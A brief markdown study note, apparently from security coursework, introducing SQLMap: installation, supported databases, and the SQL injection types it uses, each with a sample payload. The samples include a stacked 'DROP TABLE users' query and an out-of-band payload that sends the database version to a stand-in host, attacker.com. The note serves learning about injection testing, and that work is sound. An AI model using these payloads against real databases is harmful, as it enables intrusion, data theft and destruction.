# SQLMap Overview
--------

- SQLMap is a common tool that is used for automating the process of detecting and exploiting SQL Injection vulnerabilities.

- Installation
```bash
sudo apt install sqlmap
```

- Confirm the installation
```bash
python sqlmap.py
```

## Supported Databases
SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

![sqlmap-supported-db](https://raw.githubusercontent.com/hhphu/images/main/HTB/SQLMap/sqlmap-supported-db.png)

## Supported SQL Injection Types
- SQLMap supports the following types of SQL Injection:
	- B: Boolean-based blind `AND 1=1`
	- E: Error-based `AND GTID_SUBSET(@@version,0)`
	- U: Union query-based `UNION ALL SELECT 1, @@version,3`
	- S: Stacked queries `;DROP TABLE users`
	- T: Time-based blind `AND 1=IF(2>1,SLEEP(5),0)`
	- Q: Inline queries `SELECT (SELECT @@version) from`
	- Out-of-band SQL Injection `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\README.txt'))`
		